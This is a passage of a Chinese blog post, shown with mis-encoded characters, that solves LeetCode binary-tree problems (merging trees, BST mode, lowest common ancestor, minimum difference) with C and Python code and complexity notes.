id="è§£æ³•ï¼šé€’å½’-æ·±åº¦ä¼˜å…ˆæœç´¢ï¼ˆDFSï¼‰"><a href="#è§£æ³•ï¼šé€’å½’-æ·±åº¦ä¼˜å…ˆæœç´¢ï¼ˆDFSï¼‰" class="headerlink" title="è§£æ³•ï¼šé€’å½’ + æ·±åº¦ä¼˜å…ˆæœç´¢ï¼ˆDFSï¼‰"></a>è§£æ³•ï¼šé€’å½’ + æ·±åº¦ä¼˜å…ˆæœç´¢ï¼ˆDFSï¼‰</h3><p>é€å±‚é€’å½’ï¼Œåˆå¹¶åˆ°t1ä¸Šï¼š</p><ul><li><strong>t1ã€t2è‹¥ä¸ºç©ºåˆ™ç›´æ¥è¿”å›å…¶ä¸­éç©ºçš„é‚£ä¸€ä¸ª</strong></li><li><strong>å°†t2çš„valåŠ åˆ°t1çš„valä¸Š</strong></li><li><strong>åˆå¹¶t1å·¦ä¸t2å·¦</strong></li><li><strong>åˆå¹¶t1å³ä¸t2å³</strong></li></ul><p>å¾—åˆ°ä»£ç å¦‚ä¸‹ï¼š</p><h3 id="æ—¶é—´å¤æ‚åº¦ï¼š"><a href="#æ—¶é—´å¤æ‚åº¦ï¼š" class="headerlink" title="æ—¶é—´å¤æ‚åº¦ï¼š"></a>æ—¶é—´å¤æ‚åº¦ï¼š</h3><p>æœç´¢çš„æ¬¡æ•°å’Œç»“ç‚¹æ•°é‡çº¿æ€§å¢é•¿ï¼Œæ•…æ—¶é—´å¤æ‚åº¦ä¸º<strong>O</strong>(<strong>N</strong>)</p><h3 id="ç©ºé—´å¤æ‚åº¦ï¼š"><a href="#ç©ºé—´å¤æ‚åº¦ï¼š" class="headerlink" title="ç©ºé—´å¤æ‚åº¦ï¼š"></a>ç©ºé—´å¤æ‚åº¦ï¼š</h3><p>éœ€è¦çš„æ ˆç©ºé—´æ•°é‡å’Œç»“ç‚¹æ•°é‡çº¿æ€§å¢é•¿ï¼Œæ•…ç©ºé—´å¤æ‚åº¦ä¸º<strong>O</strong>(<strong>N</strong>)</p><h3 id="Cè¯­è¨€ç‰ˆï¼š"><a href="#Cè¯­è¨€ç‰ˆï¼š" class="headerlink" title="Cè¯­è¨€ç‰ˆï¼š"></a>Cè¯­è¨€ç‰ˆï¼š</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * struct TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     struct TreeNode *left;</span></span><br><span class="line"><span class="comment"> *     struct TreeNode *right;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> TreeNode* <span class="title function_">mergeTrees</span><span class="params">(<span class="keyword">struct</span> TreeNode* t1, <span class="keyword">struct</span> TreeNode* t2)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(!t1)</span><br><span class="line">        <span class="keyword">return</span> t2;</span><br><span class="line">    <span class="keyword">if</span>(!t2)</span><br><span class="line">        <span class="keyword">return</span> t1;</span><br><span class="line">    t1-&gt;val += t2-&gt;val;</span><br><span class="line">    t1-&gt;left = mergeTrees(t1-&gt;left,t2-&gt;left);</span><br><span class="line">    t1-&gt;right = mergeTrees(t1-&gt;right,t2-&gt;right);</span><br><span class="line">    <span class="keyword">return</span> t1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2020/09/23/wXgivj.png" alt="wXgivj.png"></p><h3 id="Pythonè¯­è¨€ç‰ˆï¼š"><a href="#Pythonè¯­è¨€ç‰ˆï¼š" class="headerlink" title="Pythonè¯­è¨€ç‰ˆï¼š"></a>Pythonè¯­è¨€ç‰ˆï¼š</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"># class TreeNode:</span></span><br><span class="line"><span class="comment">#     def __init__(self, x):</span></span><br><span class="line"><span class="comment">#         self.val = x</span></span><br><span class="line"><span class="comment">#         self.left = None</span></span><br><span class="line"><span class="comment">#         self.right = None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">mergeTrees</span>(<span class="params">self, t1: TreeNode, t2: TreeNode</span>) -&gt; TreeNode:</span><br><span class="line">        <span class="keyword">if</span> t1 == <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span> t2</span><br><span class="line">        <span class="keyword">if</span> t2 == <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span> t1</span><br><span class="line">        t1.val += t2.val</span><br><span class="line">        t1.left = self.mergeTrees(t1.left, t2.left)</span><br><span class="line">        t1.right = self.mergeTrees(t1.right, t2.right)</span><br><span class="line">        <span class="keyword">return</span> t1</span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2020/09/23/wXgJVx.png" alt="wXgJVx.png"></p><h2 id="0x05-äºŒå‰æœç´¢æ ‘ä¸­çš„ä¼—æ•°"><a href="#0x05-äºŒå‰æœç´¢æ ‘ä¸­çš„ä¼—æ•°" class="headerlink" title="0x05.äºŒå‰æœç´¢æ ‘ä¸­çš„ä¼—æ•°"></a>0x05.<a href="https://leetcode-cn.com/problems/find-mode-in-binary-search-tree/">äºŒå‰æœç´¢æ ‘ä¸­çš„ä¼—æ•°</a></h2><blockquote><p>ç»™å®šä¸€ä¸ªæœ‰ç›¸åŒå€¼çš„äºŒå‰æœç´¢æ ‘ï¼ˆBSTï¼‰ï¼Œæ‰¾å‡º BST ä¸­çš„æ‰€æœ‰ä¼—æ•°ï¼ˆå‡ºç°é¢‘ç‡æœ€é«˜çš„å…ƒç´ ï¼‰ã€‚</p><p>å‡å®š BST æœ‰å¦‚ä¸‹å®šä¹‰ï¼š</p><p>ç»“ç‚¹å·¦å­æ ‘ä¸­æ‰€å«ç»“ç‚¹çš„å€¼å°äºç­‰äºå½“å‰ç»“ç‚¹çš„å€¼<br>ç»“ç‚¹å³å­æ ‘ä¸­æ‰€å«ç»“ç‚¹çš„å€¼å¤§äºç­‰äºå½“å‰ç»“ç‚¹çš„å€¼<br>å·¦å­æ ‘å’Œå³å­æ ‘éƒ½æ˜¯äºŒå‰æœç´¢æ ‘<br>ä¾‹å¦‚ï¼š<br>ç»™å®š BST [1,null,2,2],</p><p>1<br> \<br>  2<br> &#x2F;<br>2<br>è¿”å›[2].</p><p>æç¤ºï¼šå¦‚æœä¼—æ•°è¶…è¿‡1ä¸ªï¼Œä¸éœ€è€ƒè™‘è¾“å‡ºé¡ºåº</p><p>è¿›é˜¶ï¼šä½ å¯ä»¥ä¸ä½¿ç”¨é¢å¤–çš„ç©ºé—´å—ï¼Ÿï¼ˆå‡è®¾ç”±é€’å½’äº§ç”Ÿçš„éšå¼è°ƒç”¨æ ˆçš„å¼€é”€ä¸è¢«è®¡ç®—åœ¨å†…ï¼‰</p><p>æ¥æºï¼šåŠ›æ‰£ï¼ˆLeetCodeï¼‰<br>é“¾æ¥ï¼š<a href="https://leetcode-cn.com/problems/find-mode-in-binary-search-tree">https://leetcode-cn.com/problems/find-mode-in-binary-search-tree</a><br>è‘—ä½œæƒå½’é¢†æ‰£ç½‘ç»œæ‰€æœ‰ã€‚å•†ä¸šè½¬è½½è¯·è”ç³»å®˜æ–¹æˆæƒï¼Œéå•†ä¸šè½¬è½½è¯·æ³¨æ˜å‡ºå¤„ã€‚</p></blockquote><h3 id="è§£æ³•ï¼šé€’å½’-æ·±åº¦ä¼˜å…ˆæœç´¢ï¼ˆDFSï¼‰-1"><a href="#è§£æ³•ï¼šé€’å½’-æ·±åº¦ä¼˜å…ˆæœç´¢ï¼ˆDFSï¼‰-1" class="headerlink" title="è§£æ³•ï¼šé€’å½’ + æ·±åº¦ä¼˜å…ˆæœç´¢ï¼ˆDFSï¼‰"></a>è§£æ³•ï¼šé€’å½’ + æ·±åº¦ä¼˜å…ˆæœç´¢ï¼ˆDFSï¼‰</h3><p>è€ƒè™‘åˆ°äºŒå‰æœç´¢æ ‘ä¸­<strong>å·¦å­æ ‘æ‰€æœ‰ç»“ç‚¹çš„å€¼å°äºå½“å‰ç»“ç‚¹å€¼å°äºå³å­æ ‘æ‰€æœ‰ç»“ç‚¹çš„å€¼</strong>ï¼Œæ•…è¿˜æ˜¯é‡‡å–<strong>æ·±åº¦ä¼˜å…ˆæœç´¢ç®—æ³•</strong></p><p>é€’å½’ä¸­åºéå†ï¼Œç”±äºäºŒå‰æœç´¢æ ‘çš„ç‰¹æ®Šæ€§è´¨ï¼Œæˆ‘ä»¬éå†çš„é¡ºåºä¸€å®šæ˜¯<strong>æ’åºå¥½çš„</strong></p><p>æ•…æ„é€ ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * struct TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     struct TreeNode *left;</span></span><br><span class="line"><span class="comment"> *     struct TreeNode *right;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Note: The returned array must be malloced, assume caller calls free().</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> max;<span class="comment">//æ•°é‡æœ€å¤šçš„æ•°çš„æ•°é‡</span></span><br><span class="line"><span class="type">int</span> num;<span class="comment">//å‰ä¸€ç»“ç‚¹çš„è¿ç»­ç»“ç‚¹ä¸ªæ•°</span></span><br><span class="line"><span class="type">int</span> pre;<span class="comment">//å‰ä¸€ç»“ç‚¹çš„å€¼</span></span><br><span class="line"><span class="type">int</span> size;<span class="comment">//è¿”å›çš„æ•°ç»„çš„å¤§å°</span></span><br><span class="line"><span class="type">int</span> *retn;<span class="comment">//è¿”å›çš„æ•°ç»„</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span>* <span class="title function_">findMode</span><span class="params">(<span class="keyword">struct</span> TreeNode* root, <span class="type">int</span>* returnSize)</span></span><br><span class="line">&#123;</span><br><span class="line">    retn = (<span class="type">int</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">int</span>)*<span class="number">2150</span>);<span class="comment">//è¿™æ˜¯å¤šæ¬¡å°è¯•åå¾—å‡ºæ¥çš„ä¸€ä¸ªå¤§æ¦‚çš„è¾¹ç•Œå€¼233333</span></span><br><span class="line">    <span class="keyword">if</span>(!root)</span><br><span class="line">    &#123;</span><br><span class="line">        *returnSize = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">return</span> retn;</span><br><span class="line">    &#125;</span><br><span class="line">    max = <span class="number">0</span>;</span><br><span class="line">    pre = <span class="number">0xdeadbeef</span>;</span><br><span class="line">    size = <span class="number">0</span>;</span><br><span class="line">    num = <span class="number">0</span>;</span><br><span class="line">    dfs(root);</span><br><span class="line">    *returnSize = size;</span><br><span class="line">    <span class="keyword">return</span> retn;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">dfs</span><span class="params">(<span class="keyword">struct</span> TreeNode * root)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(!root)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    dfs(root-&gt;left);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(root-&gt;val == pre)</span><br><span class="line">        num++;</span><br><span class="line">    <span class="keyword">else</span><span class="comment">//æ–°åºåˆ—</span></span><br><span class="line">        num = <span class="number">1</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(num &gt; max)<span class="comment">//ç›¸åŒç»“ç‚¹æ•°é‡æ¯”maxè¿˜å¤šï¼Œåˆ™è¿›è¡Œé‡ç½®</span></span><br><span class="line">    &#123;</span><br><span class="line">        size = <span class="number">0</span>;</span><br><span class="line">        retn[size++] = root-&gt;val;</span><br><span class="line">        max = num;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(num == max)<span class="comment">//å¦åˆ™ï¼Œæ”¾å…¥æ•°ç»„ä¸­</span></span><br><span class="line">    &#123;</span><br><span class="line">        retn[size++] = root-&gt;val;        </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    pre = root-&gt;val;<span class="comment">//å‚¨å­˜è¯¥ç»“ç‚¹å€¼ï¼Œç»§ç»­éå†ä¸‹ä¸€ç»“ç‚¹</span></span><br><span class="line"></span><br><span class="line">    dfs(root-&gt;right);</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2020/09/24/wxTxSA.png" alt="wxTxSA.png"></p><h2 id="0x06-äºŒå‰æœç´¢æ ‘çš„æœ€è¿‘å…¬å…±ç¥–å…ˆ"><a href="#0x06-äºŒå‰æœç´¢æ ‘çš„æœ€è¿‘å…¬å…±ç¥–å…ˆ" class="headerlink" title="0x06.äºŒå‰æœç´¢æ ‘çš„æœ€è¿‘å…¬å…±ç¥–å…ˆ"></a>0x06.<a href="https://leetcode-cn.com/problems/lowest-common-ancestor-of-a-binary-search-tree/">äºŒå‰æœç´¢æ ‘çš„æœ€è¿‘å…¬å…±ç¥–å…ˆ</a></h2><blockquote><p>ç»™å®šä¸€ä¸ªäºŒå‰æœç´¢æ ‘, æ‰¾åˆ°è¯¥æ ‘ä¸­ä¸¤ä¸ªæŒ‡å®šèŠ‚ç‚¹çš„æœ€è¿‘å…¬å…±ç¥–å…ˆã€‚</p><p>ç™¾åº¦ç™¾ç§‘ä¸­æœ€è¿‘å…¬å…±ç¥–å…ˆçš„å®šä¹‰ä¸ºï¼šâ€œå¯¹äºæœ‰æ ¹æ ‘ T çš„ä¸¤ä¸ªç»“ç‚¹ pã€qï¼Œæœ€è¿‘å…¬å…±ç¥–å…ˆè¡¨ç¤ºä¸ºä¸€ä¸ªç»“ç‚¹ xï¼Œæ»¡è¶³ x æ˜¯ pã€q çš„ç¥–å…ˆä¸” x çš„æ·±åº¦å°½å¯èƒ½å¤§ï¼ˆä¸€ä¸ªèŠ‚ç‚¹ä¹Ÿå¯ä»¥æ˜¯å®ƒè‡ªå·±çš„ç¥–å…ˆï¼‰ã€‚â€</p><p>ä¾‹å¦‚ï¼Œç»™å®šå¦‚ä¸‹äºŒå‰æœç´¢æ ‘:  root &#x3D; [6,2,8,0,4,7,9,null,null,3,5]</p><p>ç¤ºä¾‹ 1:</p><p>è¾“å…¥: root &#x3D; [6,2,8,0,4,7,9,null,null,3,5], p &#x3D; 2, q &#x3D; 8<br>è¾“å‡º: 6<br>è§£é‡Š: èŠ‚ç‚¹ 2 å’ŒèŠ‚ç‚¹ 8 çš„æœ€è¿‘å…¬å…±ç¥–å…ˆæ˜¯ 6ã€‚<br>ç¤ºä¾‹ 2:</p><p>è¾“å…¥: root &#x3D; [6,2,8,0,4,7,9,null,null,3,5], p &#x3D; 2, q &#x3D; 4<br>è¾“å‡º: 2<br>è§£é‡Š: èŠ‚ç‚¹ 2 å’ŒèŠ‚ç‚¹ 4 çš„æœ€è¿‘å…¬å…±ç¥–å…ˆæ˜¯ 2, å› ä¸ºæ ¹æ®å®šä¹‰æœ€è¿‘å…¬å…±ç¥–å…ˆèŠ‚ç‚¹å¯ä»¥ä¸ºèŠ‚ç‚¹æœ¬èº«ã€‚</p><p>è¯´æ˜:</p><p>æ‰€æœ‰èŠ‚ç‚¹çš„å€¼éƒ½æ˜¯å”¯ä¸€çš„ã€‚<br>pã€q ä¸ºä¸åŒèŠ‚ç‚¹ä¸”å‡å­˜åœ¨äºç»™å®šçš„äºŒå‰æœç´¢æ ‘ä¸­ã€‚</p><p>æ¥æºï¼šåŠ›æ‰£ï¼ˆLeetCodeï¼‰<br>é“¾æ¥ï¼š<a href="https://leetcode-cn.com/problems/lowest-common-ancestor-of-a-binary-search-tree">https://leetcode-cn.com/problems/lowest-common-ancestor-of-a-binary-search-tree</a><br>è‘—ä½œæƒå½’é¢†æ‰£ç½‘ç»œæ‰€æœ‰ã€‚å•†ä¸šè½¬è½½è¯·è”ç³»å®˜æ–¹æˆæƒï¼Œéå•†ä¸šè½¬è½½è¯·æ³¨æ˜å‡ºå¤„ã€‚</p></blockquote><blockquote><p>æ³¨ï¼šè¯¥é¢˜ä¸º2020.9.27çš„æ¯æ—¥ä¸€é¢˜</p></blockquote><h4 id="è§£æ³•ï¼šæ·±åº¦ä¼˜å…ˆæœç´¢ï¼ˆDFSï¼‰"><a href="#è§£æ³•ï¼šæ·±åº¦ä¼˜å…ˆæœç´¢ï¼ˆDFSï¼‰" class="headerlink" title="è§£æ³•ï¼šæ·±åº¦ä¼˜å…ˆæœç´¢ï¼ˆDFSï¼‰"></a>è§£æ³•ï¼šæ·±åº¦ä¼˜å…ˆæœç´¢ï¼ˆDFSï¼‰</h4><p>äºŒå‰æœç´¢æ ‘ï¼ˆBSTï¼‰æœ‰ä¸€ä¸ªå¾ˆé‡è¦çš„æ€§è´¨å°±æ˜¯<strong>å·¦å­æ ‘æ‰€æœ‰ç»“ç‚¹éƒ½å°äºå½“å‰èŠ‚ç‚¹ï¼Œå³å­æ ‘æ‰€æœ‰ç»“ç‚¹éƒ½å¤§äºå½“å‰ç»“ç‚¹</strong>ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç›´æ¥é€šè¿‡æ¯”è¾ƒç»“ç‚¹çš„å€¼æ¥è¿›è¡Œåˆ¤æ–­</p><p>æ„é€ ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * struct TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     struct TreeNode *left;</span></span><br><span class="line"><span class="comment"> *     struct TreeNode *right;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> TreeNode* <span class="title function_">lowestCommonAncestor</span><span class="params">(<span class="keyword">struct</span> TreeNode* root, <span class="keyword">struct</span> TreeNode* p, <span class="keyword">struct</span> TreeNode* q)</span> </span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(p == q)</span><br><span class="line">        <span class="keyword">return</span> p;</span><br><span class="line">    </span><br><span class="line">    <span class="type">bool</span> flag1 = p-&gt;val &gt; root-&gt;val;</span><br><span class="line">    <span class="type">bool</span> flag2 = q-&gt;val &gt; root-&gt;val;</span><br><span class="line">    <span class="keyword">if</span>(flag1 != flag2)</span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(p == root || q == root)</span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(flag1)</span><br><span class="line">        <span class="keyword">return</span> lowestCommonAncestor(root-&gt;right,p,q);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> lowestCommonAncestor(root-&gt;left,p,q);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/09/27/1sudkorBnCPqV5l.png" alt="@_I_39NAGH0__CROGOJD4XX.png"></p><h2 id="0x07-äºŒå‰æœç´¢æ ‘çš„æœ€å°ç»å¯¹å·®"><a href="#0x07-äºŒå‰æœç´¢æ ‘çš„æœ€å°ç»å¯¹å·®" class="headerlink" title="0x07 - äºŒå‰æœç´¢æ ‘çš„æœ€å°ç»å¯¹å·®"></a>0x07 - <a href="https://leetcode-cn.com/problems/minimum-absolute-difference-in-bst/">äºŒå‰æœç´¢æ ‘çš„æœ€å°ç»å¯¹å·®</a></h2><blockquote><p>ç»™ä½ ä¸€æ£µæ‰€æœ‰èŠ‚ç‚¹ä¸ºéè´Ÿå€¼çš„äºŒå‰æœç´¢æ ‘ï¼Œè¯·ä½ è®¡ç®—æ ‘ä¸­ä»»æ„ä¸¤èŠ‚ç‚¹çš„å·®çš„ç»å¯¹å€¼çš„æœ€å°å€¼ã€‚</p><p>ç¤ºä¾‹ï¼š</p><p>è¾“å…¥ï¼š</p><p>   1<br>    <br>     3<br>    &#x2F;<br>   2</p><p>è¾“å‡ºï¼š<br>1</p><p>è§£é‡Šï¼š<br>æœ€å°ç»å¯¹å·®ä¸º 1ï¼Œå…¶ä¸­ 2 å’Œ 1 çš„å·®çš„ç»å¯¹å€¼ä¸º 1ï¼ˆæˆ–è€… 2 å’Œ 3ï¼‰ã€‚</p><p>æç¤ºï¼š</p><p>æ ‘ä¸­è‡³å°‘æœ‰ 2 ä¸ªèŠ‚ç‚¹ã€‚<br>æœ¬é¢˜ä¸ 783 <a href="https://leetcode-cn.com/problems/minimum-distance-between-bst-nodes/">https://leetcode-cn.com/problems/minimum-distance-between-bst-nodes/</a> ç›¸åŒ</p><p>æ¥æºï¼šåŠ›æ‰£ï¼ˆLeetCodeï¼‰<br>é“¾æ¥ï¼š<a href="https://leetcode-cn.com/problems/minimum-absolute-difference-in-bst">https://leetcode-cn.com/problems/minimum-absolute-difference-in-bst</a><br>è‘—ä½œæƒå½’é¢†æ‰£ç½‘ç»œæ‰€æœ‰ã€‚å•†ä¸šè½¬è½½è¯·è”ç³»å®˜æ–¹æˆæƒï¼Œéå•†ä¸šè½¬è½½è¯·æ³¨æ˜å‡ºå¤„ã€‚</p></blockquote><h3 id="è§£æ³•ï¼šæ·±åº¦ä¼˜å…ˆæœç´¢-ä¸­åºéå†"><a href="#è§£æ³•ï¼šæ·±åº¦ä¼˜å…ˆæœç´¢-ä¸­åºéå†" class="headerlink" title="è§£æ³•ï¼šæ·±åº¦ä¼˜å…ˆæœç´¢ + ä¸­åºéå†"></a>è§£æ³•ï¼šæ·±åº¦ä¼˜å…ˆæœç´¢ + ä¸­åºéå†</h3><p>å› ä¸ºæ˜¯äºŒå‰æœç´¢æ ‘ï¼Œæ‰€ä»¥å½“è¿›è¡Œä¸­åºéå†æ—¶è‚¯å®šä¼šæŒ‰ç…§ä»å°åˆ°å¤§çš„ç»“ç‚¹è¿›è¡Œéå†</p><p>æœ€å°ç»å¯¹å·®è‚¯å®šå‡ºç°åœ¨ç›¸é‚»å€¼ç»“ç‚¹ä¸­ï¼Œè¿™é‡Œå°±ä¸å†è¿‡å¤šèµ˜å™äº†</p><p>æ„é€ ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * struct TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     struct TreeNode *left;</span></span><br><span class="line"><span class="comment"> *     struct TreeNode *right;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> ans = <span class="number">0xffff</span>;</span><br><span class="line"><span class="type">int</span> pre = <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">dfs</span><span class="params">(<span class="keyword">struct</span> TreeNode* root)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(!root)</span><br><span class="line">        <span class="keyword">return</span> ;</span><br><span class="line">    dfs(root-&gt;left);</span><br><span class="line">    <span class="keyword">if</span>(pre == <span class="number">-1</span>)</span><br><span class="line">        pre = root-&gt;val;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        ans = (root-&gt;val - pre) &lt; ans ? (root-&gt;val - pre) : ans;</span><br><span class="line">        pre = root-&gt;val;</span><br><span class="line">    &#125;</span><br><span class="line">    dfs(root-&gt;right);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">getMinimumDifference</span><span class="params">(<span class="keyword">struct</span> TreeNode* root)</span></span><br><span class="line">&#123;</span><br><span class="line">    pre = <span class="number">-1</span>;</span><br><span class="line">    ans = <span class="number">0xffff</span>;</span><br><span class="line">    dfs(root);</span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/10/12/EUzkxuqK2ja4cFl.png" alt="image.png"></p><h2 id="0x08-äºŒå‰æœç´¢æ ‘èŠ‚ç‚¹æœ€å°è·ç¦»"><a href="#0x08-äºŒå‰æœç´¢æ ‘èŠ‚ç‚¹æœ€å°è·ç¦»" class="headerlink" title="0x08 - äºŒå‰æœç´¢æ ‘èŠ‚ç‚¹æœ€å°è·ç¦»"></a>0x08 - <a href="https://leetcode-cn.com/problems/minimum-distance-between-bst-nodes/">äºŒå‰æœç´¢æ ‘èŠ‚ç‚¹æœ€å°è·ç¦»</a></h2><blockquote><p>ç»™å®šä¸€ä¸ªäºŒå‰æœç´¢æ ‘çš„æ ¹èŠ‚ç‚¹ rootï¼Œè¿”å›æ ‘ä¸­ä»»æ„ä¸¤èŠ‚ç‚¹çš„å·®çš„æœ€å°å€¼ã€‚</p><p>ç¤ºä¾‹ï¼š</p><p>è¾“å…¥: root &#x3D; [4,2,6,1,3,null,null]<br>è¾“å‡º: 1<br>è§£é‡Š:<br>æ³¨æ„ï¼Œrootæ˜¯æ ‘èŠ‚ç‚¹å¯¹è±¡(TreeNode object)ï¼Œè€Œä¸æ˜¯æ•°ç»„ã€‚</p><p>ç»™å®šçš„æ ‘ 